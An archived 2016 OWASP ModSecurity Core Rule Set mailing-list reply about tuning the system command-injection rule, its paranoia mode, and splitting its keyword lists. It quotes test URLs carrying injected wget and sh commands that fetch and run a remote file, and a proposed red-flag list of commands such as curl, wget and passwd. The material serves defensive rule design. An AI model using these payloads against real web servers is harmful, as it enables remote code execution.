<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Paranoia%20Mode%3A%20Controversial%0A%20candidate%20950907%20/%20932100%20%28System%20command%20injection%29&In-Reply-To=%3C20160207195530.GC30297%40elias%3E">
   <META NAME="robots" CONTENT="index,nofollow">
   <style type="text/css">
       pre {
           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
           }
   </style>
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="001900.html">
   <LINK REL="Next"  HREF="001947.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)</H1>
    <B>Christian Folini</B> 
    <A HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Paranoia%20Mode%3A%20Controversial%0A%20candidate%20950907%20/%20932100%20%28System%20command%20injection%29&In-Reply-To=%3C20160207195530.GC30297%40elias%3E"
       TITLE="[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)">christian.folini at netnea.com
       </A><BR>
    <I>Sun Feb  7 19:55:30 UTC 2016</I>
    <P><UL>
        <LI>Previous message: <A HREF="001900.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial	candidate 950907 / 932100 (System command injection)
</A></li>
        <LI>Next message: <A HREF="001947.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1908">[ date ]</a>
              <a href="thread.html#1908">[ thread ]</a>
              <a href="subject.html#1908">[ subject ]</a>
              <a href="author.html#1908">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>Hi there,

On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
&gt;<i> I like the idea of splitting the file.
</I>
Cool.

&gt;<i> I agree some of the words in os-commands.data seem rather paranoid. Words like &quot;choice&quot;, &quot;help&quot;, &quot;now&#8221; seem of low value and are common in natural text. Also, the large number of Unix-only environments could skip Windows related commands. It&#8217;s hard for users to modify these lists as you&#8217;d have to hack the CRS, and these huge collections are to maintain anyhow, so I agree we need granularity.
</I>
Good point.

&gt;<i> The rule has some regexp magic to prevent false positives, but the balance is not a complete success in my opinion. For instance, the following URLs don't trigger in CRSv3:
</I>&gt;<i> <A HREF="http://vuln/?cmd=wget%20http://example.com/blah.txt">http://vuln/?cmd=wget%20http://example.com/blah.txt</A>
</I>&gt;<i> <A HREF="http://vuln/?cmd=sh%20blah.txt">http://vuln/?cmd=sh%20blah.txt</A>
</I>&gt;<i> 
</I>&gt;<i> So it's not as strong as you would want either to prevent some common RCE.
</I>&gt;<i> Something like <A HREF="http://vuln/?cmd=Wget%20http://example.com/;%20ecHo">http://vuln/?cmd=Wget%20http://example.com/;%20ecHo</A> does trigger it.
</I>
I see. Good observations.

&gt;<i> 1) I think that a user should check their desired platforms in the setup conf. In fact, this would be great to do anyway in the initial 3.0.0 release even if we DON'T look at it in any rule yet. Specifying platform types will pave the way for reducing false positives and false negatives by skipping unnecessary checks and being more strict on the right platforms. So we could start by listing these platforms in the existing rule in the setup conf. Example:
</I>&gt;<i> 
</I>&gt;<i> 	SecAction \
</I>&gt;<i> 	  &quot;id:'900024', \
</I>&gt;<i> 	  phase:1, \
</I>&gt;<i> 	  t:none, \
</I>&gt;<i> 	  setvar:tx.unix=1, \
</I>&gt;<i> 	  setvar:tx.windows=1, \
</I>&gt;<i> 	  setvar:tx.java=1, \
</I>&gt;<i> 	  setvar:tx.php=1, \
</I>
That makes a lot of sense. At first sight.

I think that a default install should come with these rulesets
all enabled and a sysadmin can then switch them of if we is aware that
there is no php in his service.

So given the following two scenarios
#1 - Newbie sysadmin installs ModSec and runs into a lot of false positives
    because he does not disable unneeded rulesets
#2 - Newbie sysadmin installs ModSec and is p0wned because he does not enable
    the php protection
I strongly favour #1.

A vanilla install of the core rules should give you a full coverage for all
types of services and a decent security level. Reducing false positives by 
omitting certain rules (ideally rules which provide no value for your setup) 
is the very idea of tuning.
Reducing the initial number of false positives by moving certain rules
with a worse relationsship between added security and false positives,
that is the idea of the paranoia mode.

Chaim stated in a different message, that the rules are now organised
into files aimed at certain environments. So switching them off is
fairly easy. And there are the tags on top of it.
So you have tag:'language-PHP' and setting SecRuleRemoveByTag will
disable them all very easily. 

So I think, we do not need these variables.

&gt;<i> (By the way: I think it&#8217;s unfortunate that a user has to use value 1 to enable a check. An undefined variable will mean that the CRS will skip some rules. This makes it dangerous to introduce a new variable in the CRS later; all existing installations MUST then add this variable to their setup rule immediately, or suffer from reduced security. It&#8217;s better to use a scheme that defaults to &#8220;on&#8221;. A convention like &#8220;tx.disable_mysql=1&#8221; would be user unfriendly and error-prone. But we could check for an explicit &#8220;off&#8221; string, e.g. &#8220;setvar:tx.mysql=off&#8221;. If it&#8217;s not &#8220;off&#8221; then assume that the user DOES want the check. I think it&#8217;s important to get this right in 3.0.0, it will be more painful to do it later.)
</I>
That's a very good observation. I had a similar idea once.

In programming, you usually start with a default value and then
the users overrides the default value. If he wants to.

I am not sure how modsecurity_crs_10_setup.conf.example is going to
be transformed to work seamlessly with 3.0. But this makes the
setting of default values a bit tricky.

Maybe a file REQUEST-02-DEFAULTS.conf could set default values
if certain variables are not set.

&gt;<i> 2) Separate the words into multiple lists:
</I>&gt;<i> 	os-commands-critical.data (absolute red flag list: &quot;curl&quot;, &quot;passwd&quot;, &quot;sh&quot;, &quot;uname&quot;, &quot;wget&quot; etc.)
</I>&gt;<i> 	os-commands-paranoid.data (absolute low value, but high FP natural words like &quot;choice&quot;)
</I>&gt;<i> 	os-commands-windows.data (all Windows commands)
</I>&gt;<i> 	os-commands-common.data (all other commands)
</I>
Makes some sense. Too granular is difficult and you mix various
grouping criteria (criticality, paranoia, os), which makes is a
bit hard to follow. 

Other opinions?

&gt;<i> 3) Review the current regexp against some test data and CRSv2 to make it more sensitive
</I>
Good plan. Maybe this could be done in a separate pull request.
I am afraid to overload the paranoia mode pull request... 

Ahoj,

Christian


-- 
In war you will generally find that the enemy has at any time 
three courses of action open to him. Of those three, he will 
invariably choose the fourth.
-- Helmuth Von Moltke
</PRE>





















<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="001900.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial	candidate 950907 / 932100 (System command injection)
</A></li>
	<LI>Next message: <A HREF="001947.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1908">[ date ]</a>
              <a href="thread.html#1908">[ thread ]</a>
              <a href="subject.html#1908">[ subject ]</a>
              <a href="author.html#1908">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">More information about the Owasp-modsecurity-core-rule-set
mailing list</a><br>
</body></html>
